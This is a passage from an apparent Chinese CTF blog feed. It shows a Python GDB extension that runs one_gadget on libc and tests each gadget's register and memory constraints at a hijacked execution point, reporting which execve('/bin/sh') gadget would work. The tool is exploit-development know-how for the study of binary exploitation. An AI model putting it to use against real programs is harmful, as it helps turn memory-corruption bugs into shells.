class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    gadgets_info(list): 列表中的元素是元组（装有一组 one_gadget 信息），后续进行条件判断时只需要对该列表进行遍历</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;one_gadget&quot;</span>, library], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">if</span> (result.returncode != <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: &quot;</span>, result.stderr.decode().strip())</span><br><span class="line">        sys.exit(result.returncode)</span><br><span class="line">    gadgets = result.stdout.decode().strip().split(<span class="string">&quot;\n\n&quot;</span>)  <span class="comment"># 将每个gadget的条件和信息都作为一个元素存储到列表中</span></span><br><span class="line">    gadgets_info = []</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        <span class="comment"># 依次对每组元素进行单独的处理</span></span><br><span class="line">        address_line, constraints_line = gadget.strip().split(<span class="string">&quot;\nconstraints:&quot;</span>)</span><br><span class="line">        address = address_line.strip().split()[<span class="number">0</span>]</span><br><span class="line">        constraints = constraints_line.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        gadgets_info.append((address, constraints))</span><br><span class="line">    <span class="keyword">return</span> gadgets_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="keyword">return</span> gdb.parse_and_eval(<span class="string">&#x27;$&#x27;</span>+register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_address_permissions</span>(<span class="params">address</span>):</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap &quot;</span>+<span class="built_in">str</span>(address),to_string=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;There are no mappings for specified address or module&quot;</span> <span class="keyword">in</span> recv_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    recv_data=recv_data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    recv_data=recv_data.strip().split()</span><br><span class="line">    permissions=recv_data[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;w&#x27;</span> <span class="keyword">in</span> permissions:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_got_address_of_libc</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数用来判断目标地址是否为 got_address_of_libc(这个地址是 libc 中具有 rw 权限的首地址)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str):传入的为 one_gadget 需要判断是否为 got_address_of_libc的字符串</span></span><br><span class="line"><span class="string">    例如：</span></span><br><span class="line"><span class="string">    &quot;ebx is the GOT address of libc&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值:</span></span><br><span class="line"><span class="string">    (bool):如果目标地址为 got_address_of_libc 那么返回 True ，反之返回 False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">match</span>=re.findall(<span class="string">&#x27;(\w+) is the GOT address of libc&#x27;</span>,string)</span><br><span class="line">    register_value=get_register_value(<span class="keyword">match</span>[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(register_value) &lt; <span class="number">0</span>:</span><br><span class="line">        register_value=register_value+(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;rw&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            got_address_of_libc=line.split()[<span class="number">0</span>][<span class="number">5</span>:]</span><br><span class="line">            <span class="keyword">if</span> register_value == <span class="built_in">int</span>(got_address_of_libc,<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_writeable_check</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    这个函数的作用是来判断one_gadget中某个地址是否具有可写的权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">        [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">        [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">    例如上面one_gadget的第一个条件  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">    该函数将自己获取rbp-0x78 (如果是单个寄存器也可以进行判断 比如判断rsi当前地址是否具有写的权限) 的地址判断其是否为一个具有写权限的地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str):该参数是one_gadget关于某个地址是否为可写的条件字符串  例如“address rbp-0x78 is writable”</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool): 判断目标地址是否具有可写权限  如果具有写权限则返回True  反之返回False</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    result = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(\w+)&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        result = re.findall(<span class="string">r&#x27;\b\w+\b&#x27;</span>, string)</span><br><span class="line">        result = result[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        result=result[<span class="number">0</span>]</span><br><span class="line">        register=result[<span class="number">0</span>]</span><br><span class="line">        operator=result[<span class="number">1</span>]</span><br><span class="line">        operand=result[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))-<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))+<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(calc_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">3</span>:</span><br><span class="line">        register_value=get_register_value(result)</span><br><span class="line">        <span class="keyword">if</span> register_value==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(register_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value_ptr</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用获取寄存器所指向的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    register(str):被访问的寄存器名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (int):如果寄存器值为0或者寄存器的值为非法地址则返回-1  否则返回寄存器所指向的值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    address = gdb.parse_and_eval(<span class="string">&quot;$&quot;</span> + register)</span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">int</span>.from_bytes(value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_A</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rsp &amp; 0xf == 0&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register)) &amp; <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_B</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rcx == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value=<span class="built_in">int</span>(get_register_value(register))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_C</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;(u16)[rbp] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    condition=condition_list[<span class="number">0</span>]</span><br><span class="line">    register=condition_list[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> condition == <span class="string">&quot;u16&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value_ptr(register))</span><br><span class="line">        <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        calc_value=calc_value &amp; <span class="number">0xffff</span></span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_D</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[[rbp-0x70]] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=re.findall(<span class="string">r&quot;\[(\w+)([+-])(\w+)&quot;</span>, condition_list[<span class="number">0</span>])</span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) - <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> - <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) + <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> + <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_E</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[r10] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value =get_register_value_ptr(register)</span><br><span class="line">    <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_F</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[esp+0x3c] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) + <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) - <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equal_judgement</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数来处理 one_gadget 中的等式判断，我目前发现 one_gadget中的等式一共有六种类型（如下）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;rsp &amp; 0xf == 0&quot;,</span></span><br><span class="line"><span class="string">    &quot;rcx == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;(u16)[rbp] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[[rbp-0x70]] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[r10] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[esp+0x3c] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    我通过正则表达式来识别出这六种情况，并将他们的关键信息匹配出来，再调用其对应的处理函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str): 等式判断条件的字符串，例如 &quot;[esp+0x34] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool): 如果等式成立则返回 True 不成立则返回 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    judgement=[]</span><br><span class="line">    <span class="keyword">match</span>=[]</span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+)\s*(\&amp;)\s*(\w+)&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_A(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\((\w+)\)\[(\w+)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_C(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\[(.*?)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(judgement[<span class="number">0</span>].split(<span class="string">&#x27;[&#x27;</span>)) &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> condition_equal_D(judgement)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">match</span> = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(.*)&#x27;</span>, judgement[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="keyword">return</span> condition_equal_F(<span class="keyword">match</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+) == NULL&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_B(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;\[(\w+)\] == NULL&quot;</span>,string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_E(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">constraints</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用是将传入的每一组 one_gadget 按照条件进行分类，然后调用更具体的函数进行处理</span></span><br><span class="line"><span class="string">    目前我考虑了 one_gadget 的三种情况，分别是 is writeable 和 is got address of libc 以及对等式的判断</span></span><br><span class="line"><span class="string">    如果使用 l2 参数的话，会有更多的情况，我认为它们概率极小并且条件过于繁多，所以目前没有对它们进行判断</span></span><br><span class="line"><span class="string">    如果之后有条件没有考虑到需要添加的，或者想处理 l2 的 one_gadget 则在这里添加新的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    constraints(list):存储的是一组的 one_gadget 所有信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool)如果当前这组 one_gadget 的所有条件都成立返回 True 反之有一个条件没有满足就返回 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    result1 = []</span><br><span class="line">    <span class="keyword">for</span> constraint <span class="keyword">in</span> constraints:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is writable&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_writeable_check(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is the GOT address of libc&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_got_address_of_libc(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;||&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> constraint.split(<span class="string">&#x27;||&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    result1.append(equal_judgement(i))</span><br><span class="line">            result.append(<span class="built_in">any</span>(result1))</span><br><span class="line">            result1 = []</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> constraint <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(equal_judgement(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget---&gt;&#x27;</span>, result, constraints)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_gadget_cmd</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数为 check_gadget 命令的主函数</span></span><br><span class="line"><span class="string">    该命令实现了对当前位置概率略高的 one_gadget 能否生效做了判断</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    命令使用方法：</span></span><br><span class="line"><span class="string">    如果你想判断劫持执行流的这个位置是否有 one_gadget 能够生效，那么使用 gdb 调试到劫持执行流的地址处</span></span><br><span class="line"><span class="string">    使用该命令就可以看到是否有 one_gadget 能用了</span></span><br><span class="line"><span class="string">    目前只能判断概率较高的 one_gadget 能否使用，无法对 -l2 显示出来的 one_gadget 进行判断</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    check_gadget_cmd() 函数无参且无返回值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    libc_path=get_libc_path()    </span><br><span class="line">    all_gadget_info=get_gadget_info(libc_path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(all_gadget_info)):</span><br><span class="line">        gadget_address,gadget_constraints=all_gadget_info[i][<span class="number">0</span>],all_gadget_info[i][<span class="number">1</span>]</span><br><span class="line">        result=check(gadget_constraints)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;Successful one_gadget&quot;</span>+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_address-------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+gadget_address+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_info----------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+<span class="built_in">str</span>(gadget_constraints)+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&quot;define check_gadget\n\tpython check_gadget_cmd()\nend&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 尝试开发小工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程 </tag>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_final_4</title>
      <link href="/posts/d2d67d3f.html"/>
      <url>/posts/d2d67d3f.html</url>
      
